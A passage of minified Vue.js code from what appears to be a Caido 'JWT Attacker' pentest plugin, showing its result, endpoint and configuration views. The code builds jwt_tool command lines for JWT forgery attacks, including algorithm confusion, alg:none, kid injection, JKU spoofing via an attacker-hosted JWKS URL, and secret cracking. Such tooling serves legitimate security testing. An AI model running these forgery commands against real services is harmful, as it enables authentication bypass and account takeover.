}, Pf = { class: "px-4 py-3 border-b border-gray-700" }, Of = { class: "bg-gray-900 rounded p-2 font-mono text-xs break-all text-gray-300 select-all max-h-32 overflow-y-auto" }, Af = { class: "text-yellow-400" }, Ef = { class: "text-blue-400" }, If = { class: "text-red-400" }, zf = {
  key: 0,
  class: "px-4 py-3 border-b border-gray-700"
}, Rf = { class: "text-xs text-gray-500 uppercase tracking-wide mb-1" }, Lf = {
  key: 0,
  class: "text-orange-300 normal-case"
}, Nf = { class: "bg-gray-900 rounded p-2 text-xs text-green-300 overflow-x-auto max-h-48 overflow-y-auto select-all whitespace-pre" }, Mf = {
  key: 1,
  class: "px-4 py-3 border-b border-gray-700"
}, Ff = { class: "bg-gray-900 rounded p-2 text-xs text-yellow-300 overflow-x-auto max-h-48 overflow-y-auto" }, Df = {
  key: 2,
  class: "px-4 py-3 border-b border-gray-700"
}, Vf = { class: "bg-gray-900 rounded p-2 text-xs text-green-300 overflow-x-auto max-h-48 overflow-y-auto" }, Bf = {
  key: 3,
  class: "px-4 py-3 border-b border-gray-700"
}, Kf = { class: "bg-gray-900 rounded p-2 text-xs font-mono space-y-0.5 max-h-32 overflow-y-auto" }, Hf = { class: "text-blue-400 shrink-0" }, Wf = { class: "text-gray-300 break-all" }, Jf = {
  key: 4,
  class: "px-4 py-3 border-b border-gray-700"
}, Uf = { class: "bg-gray-900 rounded p-2 text-xs text-gray-300 overflow-x-auto max-h-64 overflow-y-auto whitespace-pre-wrap break-all" }, Gf = {
  key: 5,
  class: "px-4 py-3"
}, qf = {
  key: 0,
  class: "text-xs text-gray-500 mb-1.5"
}, Yf = { class: "bg-gray-900 rounded p-2 text-xs text-cyan-300 overflow-x-auto max-h-48 overflow-y-auto select-all whitespace-pre-wrap break-all" }, Xf = {
  key: 1,
  class: "flex items-center justify-center h-full text-gray-500 text-sm"
}, Qf = /* @__PURE__ */ vr({
  __name: "AttackDetail",
  props: {
    result: {}
  },
  setup(e) {
    const t = e, r = ue(!1), o = ue(!1), s = ue(!1);
    function n(h, b) {
      const C = h.replace(/\r\n/g, `
`);
      switch (b) {
        case "PEM (no trailing LF)":
          return btoa(C.replace(/\n+$/, ""));
        case "base64(PEM)":
          return btoa(btoa(C));
        case "DER":
          return C.replace(/-----[^-]+-----/g, "").replace(/\s/g, "");
        case "PEM":
        default:
          return btoa(C);
      }
    }
    function i(h) {
      try {
        return JSON.parse(xo(h));
      } catch {
        return null;
      }
    }
    const a = Ve(() => {
      const h = t.result;
      if (!h || !h.originalJWT) return null;
      const b = "python3 jwt_tool.py", C = `'${h.originalJWT}'`, I = i(h.modifiedJWT.split(".")[0] ?? "") ?? {};
      switch (h.technique) {
        case "algConfusion":
          return h.keyPem ? {
            cmd: `echo -n '${n(h.keyPem, h.secretEncoding ?? "PEM")}' | base64 -d > /tmp/jwt_pubkey
${b} ${C} -X k -pk /tmp/jwt_pubkey`,
            note: `Byte-exact. Writes the precise HMAC secret (${h.secretEncoding}) to a file, then forges the same token.` + (h.secretEncoding === "DER" ? " Note: DER is raw binary; jwt_tool reads the key file as text and may fail on it." : "")
          } : null;
        case "none":
          return {
            cmd: `${b} ${C} -X a`,
            note: "Emits the alg:none variants (none/None/NONE/nOnE) with the signature stripped — pick the casing matching this row."
          };
        case "nullSig":
          return {
            cmd: `${b} ${C} -X n`,
            note: "Produces the null-signature token (CVE-2020-28042)."
          };
        case "embeddedJwk":
          return {
            cmd: `${b} ${C} -X i`,
            note: "CVE-2018-0114. jwt_tool generates its OWN embedded key, so the jwk and signature differ from this row, but the attack is equivalent."
          };
        case "jkuSpoof": {
          const R = typeof I.jku == "string" ? I.jku : "<your-jwks-url>";
          return {
            cmd: `${b} ${C} -X s -ju '${R}'`,
            note: "jwt_tool generates its own key and JWKS — host jwt_tool's JWKS at the -ju URL (not this plugin's). The resulting token differs but the attack is equivalent."
          };
        }
        case "x5uSpoof":
          return {
            cmd: `# jwt_tool has no built-in x5u spoofing exploit.
# Closest built-in attack is JKU spoofing:
${b} ${C} -X s -ju '<your-jwks-url>'`,
            note: "x5u spoofing isn't directly supported by jwt_tool; the JKU spoof (-X s) is the nearest equivalent."
          };
        case "kidInject": {
          const R = typeof I.kid == "string" ? I.kid : "", F = h.hmacSecret ?? "";
          return {
            cmd: `${b} ${C} -I -hc kid -hv '${R}' -S hs256 -p '${F}'`,
            note: `Sets kid="${R}" and signs HS256 with the secret this injection implies ("${F}").`
          };
        }
        case "weakSecret": {
          const R = h.hmacSecret ?? "";
          return {
            cmd: `# Crack the secret from a wordlist:
${b} ${C} -C -d <wordlist.txt>
# Forge once cracked (secret = "${R}"):
${b} ${C} -S hs256 -p '${R}'`,
            note: "Crack mode recovers the secret; the second command re-signs. Add -I -pc role -pv admin (etc.) to escalate claims."
          };
        }
        case "claimTamper": {
          const R = i(h.originalJWT.split(".")[1] ?? "") ?? {}, F = i(h.modifiedJWT.split(".")[1] ?? "") ?? {}, O = [], B = [];
          for (const q of Object.keys(F))
            if (JSON.stringify(F[q]) !== JSON.stringify(R[q])) {
              const ee = typeof F[q] == "string" ? F[q] : JSON.stringify(F[q]);
              O.push(`-pc ${q} -pv '${ee}'`);
            }
          for (const q of Object.keys(R)) q in F || B.push(q);
          if (O.length) {
            let q = `${b} ${C} -I ${O.join(" ")}`;
            return B.length && (q += `
# Then delete claims interactively: ${b} ${C} -T   (remove: ${B.join(", ")})`), {
              cmd: q,
              note: "Tampers claims while leaving the original (invalid) signature — surfaces servers that skip verification. Non-string values are injected as strings; adjust if needed."
            };
          }
          return B.length ? {
            cmd: `${b} ${C} -T   # interactively delete claims: ${B.join(", ")}`,
            note: "jwt_tool can't delete claims non-interactively; use -T (tamper) mode and remove the listed claims."
          } : null;
        }
        default:
          return null;
      }
    }), l = Ve(() => {
      if (!t.result) return ["", "", ""];
      const h = t.result.modifiedJWT.split(".");
      return [h[0] ?? "", h[1] ?? "", h[2] ?? ""];
    }), u = Ve(() => {
      if (!t.result) return null;
      try {
        const h = xo(l.value[0]);
        return JSON.stringify(JSON.parse(h), null, 2);
      } catch {
        return null;
      }
    }), c = Ve(() => {
      if (!t.result) return null;
      try {
        const h = xo(l.value[1]);
        return JSON.stringify(JSON.parse(h), null, 2);
      } catch {
        return null;
      }
    });
    async function p() {
      t.result && (await navigator.clipboard.writeText(t.result.modifiedJWT), r.value = !0, setTimeout(() => {
        r.value = !1;
      }, 1500));
    }
    async function m() {
      var h;
      (h = t.result) != null && h.keyPem && (await navigator.clipboard.writeText(t.result.keyPem), o.value = !0, setTimeout(() => {
        o.value = !1;
      }, 1500));
    }
    async function g() {
      a.value && (await navigator.clipboard.writeText(a.value.cmd), s.value = !0, setTimeout(() => {
        s.value = !1;
      }, 1500));
    }
    return (h, b) => e.result ? (P(), A("div", vf, [
      L(" Technique header "),
      x("div", yf, [
        x(
          "span",
          {
            class: De(["px-2 py-0.5 rounded text-xs font-mono font-semibold shrink-0", Ae(ja)(e.result.technique)])
          },
          E(e.result.technique),
          3
          /* TEXT, CLASS */
        ),
        x("div", kf, [
          x(
            "p",
            wf,
            E(e.result.techniqueName),
            1
            /* TEXT */
          ),
          x(
            "p",
            _f,
            E(e.result.description),
            1
            /* TEXT */
          )
        ])
      ]),
      x("div", Sf, [
        L(" Status summary "),
        x("div", Cf, [
          e.result.responseStatus ? (P(), A(
            "span",
            {
              key: 0,
              class: De(["font-bold", Ae(Ca)(e.result.responseStatus)])
            },
            " HTTP " + E(e.result.responseStatus),
            3
            /* TEXT, CLASS */
          )) : L("v-if", !0),
          e.result.responseLength !== void 0 ? (P(), A(
            "span",
            jf,
            E(e.result.responseLength) + " bytes ",
            1
            /* TEXT */
          )) : L("v-if", !0),
          e.result.durationMs !== void 0 ? (P(), A(
            "span",
            Tf,
            E(e.result.durationMs) + "ms ",
            1
            /* TEXT */
          )) : L("v-if", !0),
          e.result.error ? (P(), A(
            "span",
            $f,
            "Error: " + E(e.result.error),
            1
            /* TEXT */
          )) : L("v-if", !0)
        ]),
        L(" Modified JWT "),
        x("section", Pf, [
          b[2] || (b[2] = x(
            "p",
            { class: "text-xs text-gray-500 uppercase tracking-wide mb-1" },
            "Modified JWT",
            -1
            /* CACHED */
          )),
          x("div", Of, [
            x(
              "span",
              Af,
              E(l.value[0]),
              1
              /* TEXT */
            ),
            b[0] || (b[0] = ze(
              ".",
              -1
              /* CACHED */
            )),
            x(
              "span",
              Ef,
              E(l.value[1]),
              1
              /* TEXT */
            ),
            b[1] || (b[1] = ze(
              ".",
              -1
              /* CACHED */
            )),
            x(
              "span",
              If,
              E(l.value[2]),
              1
              /* TEXT */
            )
          ]),
          x(
            "button",
            {
              onClick: p,
              class: "mt-1.5 text-xs text-gray-500 hover:text-gray-300 transition-colors"
            },
            E(r.value ? "✓ Copied" : "Copy JWT"),
            1
            /* TEXT */
          )
        ]),
        L(" Public key / certificate used (algorithm confusion) "),
        e.result.keyPem ? (P(), A("section", zf, [
          x("p", Rf, [
            b[3] || (b[3] = ze(
              " Public Key / Certificate Used ",
              -1
              /* CACHED */
            )),
            e.result.secretEncoding ? (P(), A(
              "span",
              Lf,
              " — HMAC secret: " + E(e.result.secretEncoding),
              1
              /* TEXT */
            )) : L("v-if", !0)
          ]),
          x(
            "pre",
            Nf,
            E(e.result.keyPem),
            1
            /* TEXT */
          ),
          x(
            "button",
            {
              onClick: m,
              class: "mt-1.5 text-xs text-gray-500 hover:text-gray-300 transition-colors"
            },
            E(o.value ? "✓ Copied" : "Copy PEM"),
            1
            /* TEXT */
          )
        ])) : L("v-if", !0),
        L(" Decoded header "),
        u.value ? (P(), A("section", Mf, [
          b[4] || (b[4] = x(
            "p",
            { class: "text-xs text-gray-500 uppercase tracking-wide mb-1" },
            "Decoded Header",
            -1
            /* CACHED */
          )),
          x(
            "pre",
            Ff,
            E(u.value),
            1
            /* TEXT */
          )
        ])) : L("v-if", !0),
        L(" Decoded payload "),
        c.value ? (P(), A("section", Df, [
          b[5] || (b[5] = x(
            "p",
            { class: "text-xs text-gray-500 uppercase tracking-wide mb-1" },
            "Decoded Payload",
            -1
            /* CACHED */
          )),
          x(
            "pre",
            Vf,
            E(c.value),
            1
            /* TEXT */
          )
        ])) : L("v-if", !0),
        L(" Response headers "),
        e.result.responseHeaders && Object.keys(e.result.responseHeaders).length ? (P(), A("section", Bf, [
          b[6] || (b[6] = x(
            "p",
            { class: "text-xs text-gray-500 uppercase tracking-wide mb-1" },
            "Response Headers",
            -1
            /* CACHED */
          )),
          x("div", Kf, [
            (P(!0), A(
              ne,
              null,
              Me(e.result.responseHeaders, (C, I) => (P(), A("div", {
                key: I,
                class: "flex gap-2"
              }, [
                x(
                  "span",
                  Hf,
                  E(I) + ":",
                  1
                  /* TEXT */
                ),
                x(
                  "span",
                  Wf,
                  E(C),
                  1
                  /* TEXT */
                )
              ]))),
              128
              /* KEYED_FRAGMENT */
            ))
          ])
        ])) : L("v-if", !0),
        L(" Response body "),
        e.result.responseBody ? (P(), A("section", Jf, [
          b[7] || (b[7] = x(
            "p",
            { class: "text-xs text-gray-500 uppercase tracking-wide mb-1" },
            "Response Body",
            -1
            /* CACHED */
          )),
          x(
            "pre",
            Uf,
            E(e.result.responseBody),
            1
            /* TEXT */
          )
        ])) : L("v-if", !0),
        L(" Reproduce with jwt_tool "),
        a.value ? (P(), A("section", Gf, [
          b[8] || (b[8] = x(
            "p",
            { class: "text-xs text-gray-500 uppercase tracking-wide mb-1" },
            "Reproduce with jwt_tool",
            -1
            /* CACHED */
          )),
          a.value.note ? (P(), A(
            "p",
            qf,
            E(a.value.note),
            1
            /* TEXT */
          )) : L("v-if", !0),
          x(
            "pre",
            Yf,
            E(a.value.cmd),
            1
            /* TEXT */
          ),
          x(
            "button",
            {
              onClick: g,
              class: "mt-1.5 text-xs text-gray-500 hover:text-gray-300 transition-colors"
            },
            E(s.value ? "✓ Copied" : "Copy commands"),
            1
            /* TEXT */
          )
        ])) : L("v-if", !0)
      ])
    ])) : (P(), A("div", Xf, " Select an attack to see details "));
  }
}), Zf = {
  key: 0,
  class: "h-full flex flex-col overflow-hidden text-sm"
}, e0 = { class: "px-4 py-3 border-b border-gray-700 bg-gray-900 flex items-start gap-3" }, t0 = { class: "px-2 py-0.5 rounded text-xs font-mono font-semibold shrink-0 bg-cyan-800 text-cyan-100" }, r0 = { class: "flex-1 min-w-0" }, o0 = { class: "text-gray-400 text-xs mt-0.5" }, s0 = { class: "flex-1 overflow-y-auto" }, n0 = { class: "px-4 py-3 border-b border-gray-700" }, a0 = { class: "bg-gray-900 rounded p-2 font-mono text-xs break-all text-cyan-300 select-all" }, i0 = { class: "px-4 py-3 border-b border-gray-700" }, l0 = { class: "text-gray-300 text-xs" }, c0 = {
  key: 0,
  class: "px-4 py-3 border-b border-gray-700"
}, u0 = { class: "text-xs text-gray-500 uppercase tracking-wide mb-1" }, d0 = { class: "bg-gray-900 rounded p-2 text-xs text-green-300 overflow-x-auto max-h-48 overflow-y-auto select-all whitespace-pre" }, f0 = ["onClick"], p0 = { class: "text-xs text-gray-500 mt-2 mb-1" }, b0 = { class: "flex items-center gap-2" }, g0 = { class: "text-xs font-mono text-orange-300" }, h0 = ["onClick"], m0 = { class: "bg-gray-900 rounded p-2 text-xs text-gray-300 overflow-x-auto max-h-24 overflow-y-auto select-all whitespace-pre-wrap break-all" }, x0 = { class: "px-4 py-3" }, v0 = { class: "bg-gray-900 rounded p-2 text-xs text-gray-300 overflow-x-auto max-h-96 overflow-y-auto whitespace-pre-wrap break-all" }, y0 = {
  key: 1,
  class: "flex items-center justify-center h-full text-gray-500 text-sm"
}, k0 = /* @__PURE__ */ vr({
  __name: "EndpointDetail",
  props: {
    endpoint: {}
  },
  setup(e) {
    const t = e, r = ue(null);
    function o(i) {
      const a = i.replace(/\r\n/g, `
`);
      return [
        { label: "PEM", value: a },
        { label: "PEM (no trailing LF)", value: a.replace(/\n+$/, "") },
        { label: "base64(PEM)", value: btoa(a) },
        { label: "DER (base64)", value: a.replace(/-----[^-]+-----/g, "").replace(/\s/g, "") }
      ];
    }
    const s = Ve(
      () => {
        var i;
        return (((i = t.endpoint) == null ? void 0 : i.pems) ?? []).map((a) => ({ pem: a, variants: o(a) }));
      }
    );
    async function n(i, a) {
      await navigator.clipboard.writeText(i), r.value = a, setTimeout(() => {
        r.value = null;
      }, 1500);
    }
    return (i, a) => e.endpoint ? (P(), A("div", Zf, [
      L(" Header "),
      x("div", e0, [
        x(
          "span",
          t0,
          E(e.endpoint.source),
          1
          /* TEXT */
        ),
        x("div", r0, [
          a[2] || (a[2] = x(
            "p",
            { class: "font-semibold text-gray-100" },
            "Discovered key endpoint",
            -1
            /* CACHED */
          )),
          x(
            "p",
            o0,
            E(e.endpoint.keyCount) + " key(s) extracted and used for algorithm-confusion attacks. ",
            1
            /* TEXT */
          )
        ])
      ]),
      x("div", s0, [
        L(" URL "),
        x("section", n0, [
          a[3] || (a[3] = x(
            "p",
            { class: "text-xs text-gray-500 uppercase tracking-wide mb-1" },
            "URL",
            -1
            /* CACHED */
          )),
          x(
            "div",
            a0,
            E(e.endpoint.url),
            1
            /* TEXT */
          ),
          x(
            "button",
            {
              onClick: a[0] || (a[0] = (l) => n(e.endpoint.url, "url")),
              class: "mt-1.5 text-xs text-gray-500 hover:text-gray-300 transition-colors"
            },
            E(r.value === "url" ? "✓ Copied" : "Copy URL"),
            1
            /* TEXT */
          )
        ]),
        L(" Keys extracted "),
        x("section", i0, [
          a[4] || (a[4] = x(
            "p",
            { class: "text-xs text-gray-500 uppercase tracking-wide mb-1" },
            "Keys extracted",
            -1
            /* CACHED */
          )),
          x(
            "p",
            l0,
            E(e.endpoint.keyCount),
            1
            /* TEXT */
          )
        ]),
        L(" PEM keys + the HMAC secret encodings used in algorithm confusion "),
        s.value.length ? (P(), A("section", c0, [
          x(
            "p",
            u0,
            " PEM-encoded " + E(s.value.length > 1 ? "keys" : "key") + " used in algorithm-confusion attacks ",
            1
            /* TEXT */
          ),
          (P(!0), A(
            ne,
            null,
            Me(s.value, (l, u) => (P(), A("div", {
              key: u,
              class: "mb-4 last:mb-0"
            }, [
              x(
                "pre",
                d0,
                E(l.pem),
                1
                /* TEXT */
              ),
              x("button", {
                onClick: (c) => n(l.pem, "pem-" + u),
                class: "mt-1 text-xs text-gray-500 hover:text-gray-300 transition-colors"
              }, E(r.value === "pem-" + u ? "✓ Copied" : "Copy PEM"), 9, f0),
              x(
                "p",
                p0,
                " HMAC secret encodings tried with this key (key " + E(u + 1) + "): ",
                1
                /* TEXT */
              ),
              (P(!0), A(
                ne,
                null,
                Me(l.variants, (c, p) => (P(), A("div", {
                  key: p,
                  class: "mb-1.5"
                }, [
                  x("div", b0, [
                    x(
                      "span",
                      g0,
                      E(c.label),
                      1
                      /* TEXT */
                    ),
                    x("button", {
                      onClick: (m) => n(c.value, `var-${u}-${p}`),
                      class: "text-xs text-gray-500 hover:text-gray-300 transition-colors"
                    }, E(r.value === `var-${u}-${p}` ? "✓ Copied" : "Copy"), 9, h0)
                  ]),
                  x(
                    "pre",
                    m0,
                    E(c.value),
                    1
                    /* TEXT */
                  )
                ]))),
                128
                /* KEYED_FRAGMENT */
              ))
            ]))),
            128
            /* KEYED_FRAGMENT */
          ))
        ])) : L("v-if", !0),
        L(" Raw content returned "),
        x("section", x0, [
          a[5] || (a[5] = x(
            "p",
            { class: "text-xs text-gray-500 uppercase tracking-wide mb-1" },
            "Content returned by URL",
            -1
            /* CACHED */
          )),
          x(
            "pre",
            v0,
            E(e.endpoint.content || "(empty)"),
            1
            /* TEXT */
          ),
          x(
            "button",
            {
              onClick: a[1] || (a[1] = (l) => n(e.endpoint.content, "content")),
              class: "mt-1.5 text-xs text-gray-500 hover:text-gray-300 transition-colors"
            },
            E(r.value === "content" ? "✓ Copied" : "Copy Content"),
            1
            /* TEXT */
          )
        ])
      ])
    ])) : (P(), A("div", y0, " Select an item to see details "));
  }
}), Ta = /* @__PURE__ */ ba("config", () => {
  const e = ue({ ...Hr });
  let t = null;
  function r(i) {
    t = i;
  }
  async function o() {
    if (t)
      try {
        const i = await t.storage.get("config");
        i && typeof i == "object" && (e.value = { ...Hr, ...i });
      } catch {
      }
  }
  async function s() {
    if (t)
      try {
        await t.storage.set("config", e.value);
      } catch {
      }
  }
  function n(i) {
    e.value = { ...e.value, ...i };
  }
  return { config: e, setSDK: r, load: o, save: s, update: n };
}), w0 = { class: "h-full overflow-y-auto px-4 py-4 space-y-6 text-sm" }, _0 = { class: "space-y-3" }, S0 = ["value"], C0 = { class: "text-xs text-gray-500 mt-1" }, j0 = ["value"], T0 = { class: "space-y-2" }, $0 = ["checked", "onChange"], P0 = { class: "text-gray-300" }, O0 = { class: "flex items-start gap-2 cursor-pointer select-none" }, A0 = { class: "pt-2 flex gap-3" }, E0 = {
  key: 0,
  class: "text-xs text-green-400 self-center"
}, I0 = /* @__PURE__ */ vr({
  __name: "ConfigPanel",
  setup(e) {
    const t = Ta(), r = Wt({ ...t.config }), o = ue(!1);
    Ye(() => t.config, (i) => Object.assign(r, i), { deep: !0 });
    function s() {
      r.jwksPaths = [...Hr.jwksPaths];
    }
    async function n() {
      t.update({ ...r }), await t.save(), o.value = !0, setTimeout(() => {
        o.value = !1;
      }, 2e3);
    }
    return (i, a) => (P(), A("div", w0, [
      x("section", null, [
        a[7] || (a[7] = x(
          "h2",
          { class: "text-xs font-semibold text-gray-400 uppercase tracking-wider mb-3" },
          "JKU / X5U Spoofing",
          -1
          /* CACHED */
        )),
        a[8] || (a[8] = x(
          "label",
          { class: "block mb-1 text-gray-300" },
          "JWKS Endpoint URL",
          -1
          /* CACHED */
        )),
        Ct(x(
          "input",
          {
            "onUpdate:modelValue": a[0] || (a[0] = (l) => r.jwksUrl = l),
            type: "url",
            placeholder: "https://attacker.example.com/jwks.json",
            class: "w-full bg-gray-800 border border-gray-600 rounded px-3 py-1.5 text-gray-200 text-xs font-mono focus:outline-none focus:border-blue-500"
          },
          null,
          512
          /* NEED_PATCH */
        ), [
          [jr, r.jwksUrl]
        ]),
        a[9] || (a[9] = x(
          "p",
          { class: "text-xs text-gray-500 mt-1" },
          " Host the generated JWKS JSON at this URL so the target server can fetch it. ",
          -1
          /* CACHED */
        ))
      ]),
      x("section", null, [
        a[13] || (a[13] = x(
          "h2",
          { class: "text-xs font-semibold text-gray-400 uppercase tracking-wider mb-3" },
          "Custom Keys / Certificate",
          -1
          /* CACHED */
        )),
        x("div", _0, [
          x("div", null, [
            a[10] || (a[10] = x(
              "label",
              { class: "block mb-1 text-gray-300" },
              "Public Key (PEM)",
              -1
              /* CACHED */
            )),
            Ct(x(
              "textarea",
              {
                "onUpdate:modelValue": a[1] || (a[1] = (l) => r.customPublicKeyPem = l),
                rows: "4",
                placeholder: `-----BEGIN PUBLIC KEY-----
...`,
                class: "w-full bg-gray-800 border border-gray-600 rounded px-3 py-1.5 text-gray-200 text-xs font-mono focus:outline-none focus:border-blue-500 resize-none"
              },
              null,
              512
              /* NEED_PATCH */
            ), [
              [jr, r.customPublicKeyPem]
            ])
          ]),
          x("div", null, [
            a[11] || (a[11] = x(
              "label",
              { class: "block mb-1 text-gray-300" },
              "Private Key (PEM) — for JKU/X5U spoofing",
              -1
              /* CACHED */
            )),
            Ct(x(
              "textarea",
              {
                "onUpdate:modelValue": a[2] || (a[2] = (l) => r.customPrivateKeyPem = l),
                rows: "4",
                placeholder: `-----BEGIN PRIVATE KEY-----
...`,
                class: "w-full bg-gray-800 border border-gray-600 rounded px-3 py-1.5 text-gray-200 text-xs font-mono focus:outline-none focus:border-blue-500 resize-none"
              },
              null,
              512
              /* NEED_PATCH */
            ), [
              [jr, r.customPrivateKeyPem]
            ])
          ]),
          x("div", null, [
            a[12] || (a[12] = x(
              "label",
              { class: "block mb-1 text-gray-300" },
              "Certificate (PEM) — for algorithm confusion",
              -1
              /* CACHED */
            )),
            Ct(x(
              "textarea",
              {
                "onUpdate:modelValue": a[3] || (a[3] = (l) => r.customCertPem = l),
                rows: "4",
                placeholder: `-----BEGIN CERTIFICATE-----
...`,
                class: "w-full bg-gray-800 border border-gray-600 rounded px-3 py-1.5 text-gray-200 text-xs font-mono focus:outline-none focus:border-blue-500 resize-none"
              },
              null,
              512
              /* NEED_PATCH */
            ), [
              [jr, r.customCertPem]
            ])
          ])
        ])
      ]),
      x("section", null, [
        x("div", { class: "flex items-center justify-between mb-3" }, [
          a[14] || (a[14] = x(
            "h2",
            { class: "text-xs font-semibold text-gray-400 uppercase tracking-wider" },
            "JWKS Discovery Paths",
            -1
            /* CACHED */
          )),
          x("button", {
            onClick: s,
            class: "text-xs text-gray-400 hover:text-blue-400 transition-colors",
            title: "Restore the built-in default JWKS path list"
          }, "↺ Reset to defaults")
        ]),
        x("textarea", {
          value: r.jwksPaths.join(`
`),
          onInput: a[4] || (a[4] = (l) => r.jwksPaths = l.target.value.split(`
`).map((u) => u.trim()).filter(Boolean)),
          rows: "10",
          placeholder: `/.well-known/jwks.json
/jwks.json`,
          class: "w-full bg-gray-800 border border-gray-600 rounded px-3 py-1.5 text-gray-200 text-xs font-mono focus:outline-none focus:border-blue-500 resize-y"
        }, null, 40, S0),
        x(
          "p",
          C0,
          " One path per line. These are the exact paths probed on the target host for a JWKS. Edit freely — use Reset to restore the built-in defaults (" + E(Ae(Hr).jwksPaths.length) + " paths). ",
          1
          /* TEXT */
        )
      ]),
      x("section", null, [
        a[15] || (a[15] = x(
          "h2",
          { class: "text-xs font-semibold text-gray-400 uppercase tracking-wider mb-3" },
          "Custom Wordlist (Weak Secret)",
          -1
          /* CACHED */
        )),
        x("textarea", {
          value: r.customWordlist.join(`
`),
          onInput: a[5] || (a[5] = (l) => r.customWordlist = l.target.value.split(`
`).map((u) => u.trim()).filter(Boolean)),
          rows: "4",
          placeholder: `mysecret
appkey123`,
          class: "w-full bg-gray-800 border border-gray-600 rounded px-3 py-1.5 text-gray-200 text-xs font-mono focus:outline-none focus:border-blue-500 resize-none"
        }, null, 40, j0),
        a[16] || (a[16] = x(
          "p",
          { class: "text-xs text-gray-500 mt-1" },
          "One word per line. Appended to the built-in list of ~120 common JWT secrets.",
          -1
          /* CACHED */
        ))
      ]),
      x("section", null, [
        a[17] || (a[17] = x(
          "h2",
          { class: "text-xs font-semibold text-gray-400 uppercase tracking-wider mb-3" },
          "Enabled Attacks",
          -1
          /* CACHED */
        )),
        x("div", T0, [
          (P(!0), A(
            ne,
            null,
            Me(Ae(Bd), (l, u) => (P(), A("label", {
              key: u,
              class: "flex items-center gap-2 cursor-pointer select-none"
            }, [
              x("input", {
                type: "checkbox",
                checked: r.enabledAttacks[u] ?? !0,
                onChange: (c) => r.enabledAttacks[u] = c.target.checked,
                class: "accent-blue-500"
              }, null, 40, $0),
              x(
                "span",
                P0,
                E(l),
                1
                /* TEXT */
              )
            ]))),
            128
            /* KEYED_FRAGMENT */
          ))
        ])
      ]),
      x("section", null, [
        a[19] || (a[19] = x(
          "h2",
          { class: "text-xs font-semibold text-gray-400 uppercase tracking-wider mb-3" },
          "Experimental",
          -1
          /* CACHED */
        )),
        x("label", O0, [
          Ct(x(
            "input",
            {
              type: "checkbox",
              "onUpdate:modelValue": a[6] || (a[6] = (l) => r.enableKeyRecovery = l),
              class: "accent-blue-500 mt-0.5"
            },
            null,
            512
            /* NEED_PATCH */
          ), [
            [Hl, r.enableKeyRecovery]
          ]),
          a[18] || (a[18] = x(
            "span",
            { class: "text-gray-300" },
            [
              ze(" RSA public-key recovery from HTTP history "),
              x("span", { class: "block text-xs text-gray-500 mt-0.5" }, [
                ze(" Attempts to recover the signing key from 2+ same-host RS/PS JWTs, then runs algorithm-confusion with it. Off by default — the math (sig"),
                x("sup", null, "65537"),
                ze(") is extremely slow in Caido's JS runtime and may take many minutes or not finish. ")
              ])
            ],
            -1
            /* CACHED */
          ))
        ])
      ]),
      x("div", A0, [
        x("button", {
          onClick: n,
          class: "px-4 py-1.5 bg-blue-600 hover:bg-blue-500 text-white text-xs rounded transition-colors"
        }, " Save "),
        o.value ? (P(), A("span", E0, "✓ Saved")) : L("v-if", !0)
      ])
    ]));
  }
}), z0 = {
  id: "plugin--jwt-attacker",
  class: "h-full flex flex-col bg-gray-950 text-gray-200 overflow-hidden"
}, R0 = { class: "flex items-center gap-1 px-3 py-2 border-b border-gray-700 bg-gray-900 shrink-0" }, L0 = ["onClick"], N0 = { class: "flex-1 flex overflow-hidden min-h-0" }, M0 = { class: "w-[42%] shrink-0 border-r border-gray-700 overflow-hidden flex flex-col" }, F0 = { class: "flex-1 overflow-hidden" }, D0 = { class: "flex-1 overflow-hidden" }, V0 = { class: "bg-gray-900 border border-gray-700 rounded-lg w-full max-w-2xl max-h-[80vh] flex flex-col shadow-2xl" }, B0 = { class: "flex items-center justify-between px-4 py-3 border-b border-gray-700" }, K0 = { class: "flex-1 overflow-y-auto px-4 py-4 space-y-4" }, H0 = { class: "bg-gray-800 rounded p-3 text-xs text-green-300 overflow-x-auto select-all max-h-48" }, W0 = { key: 0 }, J0 = { class: "bg-gray-800 rounded p-3 text-xs text-yellow-300 overflow-x-auto select-all max-h-36" }, U0 = /* @__PURE__ */ vr({
  __name: "App",
  setup(e) {
    const t = ue("results"), r = ue(null), o = ue(null), s = ue(null);
    function n(u) {
      r.value = u, o.value = null;
    }
    function i(u) {
      o.value = u, r.value = null;
    }
    const a = [
      { id: "results", label: "Results" },
      { id: "config", label: "Configuration" }
    ];
    async function l(u) {
      await navigator.clipboard.writeText(u);
    }
    return (u, c) => {
      var p, m;
      return P(), A("div", z0, [
        L(" Top bar "),
        x("div", R0, [
          c[5] || (c[5] = x(
            "span",
            { class: "text-base font-bold text-yellow-400 mr-2" },
            "🔑 JWT Attacker",
            -1
            /* CACHED */
          )),
          (P(), A(
            ne,
            null,
            Me(a, (g) => x("button", {
              key: g.id,
              onClick: (h) => t.value = g.id,
              class: De([
                "px-3 py-1 rounded text-xs font-medium transition-colors",
                t.value === g.id ? "bg-gray-700 text-white" : "text-gray-400 hover:text-gray-200"
              ])
            }, E(g.label), 11, L0)),
            64
            /* STABLE_FRAGMENT */
          ))
        ]),
        L(" Results tab: split pane "),
        Ct(x(
          "div",
          N0,
          [
            x("div", M0, [
              Ke(xf, {
                "selected-id": (p = r.value) == null ? void 0 : p.id,
                "selected-endpoint-url": (m = o.value) == null ? void 0 : m.url,
                onSelect: n,
                onSelectEndpoint: i,
                onShowJwks: c[0] || (c[0] = (g) => s.value = g)
              }, null, 8, ["selected-id", "selected-endpoint-url"])
            ]),
            x("div", F0, [
              o.value ? (P(), To(k0, {
                key: 0,
                endpoint: o.value
              }, null, 8, ["endpoint"])) : (P(), To(Qf, {
                key: 1,
                result: r.value ?? null
              }, null, 8, ["result"]))
            ])
          ],
          512
          /* NEED_PATCH */
        ), [
          [_s, t.value === "results"]
        ]),
        L(" Config tab "),
        Ct(x(
          "div",
          D0,
          [
            Ke(I0)
          ],
          512
          /* NEED_PATCH */
        ), [
          [_s, t.value === "config"]
        ]),
        L(" JWKS modal "),
        s.value ? (P(), A("div", {
          key: 0,
          class: "fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-6",
          onClick: c[4] || (c[4] = Gl((g) => s.value = null, ["self"]))
        }, [
          x("div", V0, [
            x("div", B0, [
              c[6] || (c[6] = x(
                "h2",
                { class: "text-sm font-semibold" },
                "JKU/X5U Spoofing — JWKS Payload",
                -1
                /* CACHED */
              )),
              x("button", {
                onClick: c[1] || (c[1] = (g) => s.value = null),
                class: "text-gray-500 hover:text-gray-300 text-lg leading-none"
              }, "✕")
            ]),
            x("div", K0, [
              x("div", null, [
                c[7] || (c[7] = x(
                  "p",
                  { class: "text-xs text-gray-400 mb-2" },
